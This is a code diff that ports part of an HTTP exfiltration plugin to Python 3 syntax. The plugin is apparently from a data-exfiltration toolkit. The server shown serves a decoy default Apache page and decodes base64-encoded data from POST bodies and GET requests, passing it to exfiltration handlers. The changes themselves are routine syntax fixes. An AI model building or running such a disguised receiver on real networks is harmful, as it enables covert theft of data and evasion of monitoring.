@@ -1,3 +1,4 @@
+from __future__ import print_function
 import requests
 import base64
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
@@ -17,8 +18,8 @@ else:
 headers = requests.utils.default_headers()
 headers.update({'User-Agent': user_agent})
 
-html_file = open('plugins/misc/default_apache_page.html', 'r')
-html_content = html_file.read()
+with open('plugins/misc/default_apache_page.html', 'r') as html_file:
+    html_content = html_file.read()
 
 config = None
 app_exfiltrate = None
@@ -38,12 +39,12 @@ class S(BaseHTTPRequestHandler):
         content_len = int(self.headers.getheader('content-length', 0))
         post_body = self.rfile.read(content_len)
         tmp = post_body.split('=', 1)
-        if (tmp[0] == "data"):
+        if tmp[0] == "data":
             try:
                 data = base64.b64decode(urllib.unquote(tmp[1]))
                 self.server.handler(data)
-            except Exception, e:
-                print e
+            except Exception as e:
+                print(e)
                 pass
 
     def do_GET(self):
@@ -53,7 +54,7 @@ class S(BaseHTTPRequestHandler):
             try:
                 data = base64.b64decode(string)
                 app_exfiltrate.retrieve_data(data)
-            except Exception, e:
+            except Exception as e:
                 pass
         except:
             self._set_headers()
@@ -64,8 +65,8 @@ class S(BaseHTTPRequestHandler):
                     data = base64.b64decode(string)
                     app_exfiltrate.retrieve_data(data)
                     self.server.handler(data)
-                except Exception, e:
-                    print e
+                except Exception as e:
+                    print(e)
                     pass
 
 def send(data):
